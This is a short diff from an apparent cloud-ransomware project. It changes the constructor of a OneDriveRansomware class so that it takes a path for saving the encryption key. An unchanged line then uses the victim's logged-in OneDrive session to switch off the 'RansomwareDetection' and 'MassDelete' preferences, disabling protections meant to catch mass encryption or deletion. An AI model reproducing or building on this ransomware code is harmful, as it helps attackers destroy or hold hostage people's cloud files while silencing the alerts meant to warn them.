@@ -5,8 +5,8 @@ from doubledrive.cloud_ransomware.cloud_drive_ransomware import CloudDriveRansom
 
 class OneDriveRansomware(CloudDriveRansomware):
 
-    def __init__(self, logged_in_cloud_drive: OneDrive, save_key_dir_path: str = ".", first_stage_done_delay = 10, second_stage_done_delay = 10):
-        super().__init__(logged_in_cloud_drive, save_key_dir_path)
+    def __init__(self, logged_in_cloud_drive: OneDrive, save_key_path: str, first_stage_done_delay = 10, second_stage_done_delay = 10):
+        super().__init__(logged_in_cloud_drive, save_key_path)
         self.__first_stage_done_delay = first_stage_done_delay
         self.__second_stage_done_delay = second_stage_done_delay
         self._cloud_drive.patch_user_preferences({"RansomwareDetection": False, "MassDelete": False})
